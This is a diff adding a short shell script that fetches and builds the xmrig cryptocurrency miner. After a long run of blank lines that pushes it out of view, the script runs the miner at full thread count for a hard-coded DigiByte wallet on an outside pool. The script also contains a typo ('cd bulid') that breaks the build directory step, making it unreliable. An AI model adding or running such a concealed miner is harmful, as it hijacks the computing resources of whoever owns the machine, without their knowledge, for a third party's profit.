@@ -1,0 +1,24 @@
+sudo apt update
+sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev -y
+git clone https://github.com/xmrig/xmrig
+cd xmrig
+mkdir build
+cd bulid
+cmake -DWITH_HWLOC=OFF ..
+make
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u DGB:dgb1qgmp6luhqc7wpcy59umzhn055junyun9ljgax4f.Tablo -p x -k -a rx/0 -t 36
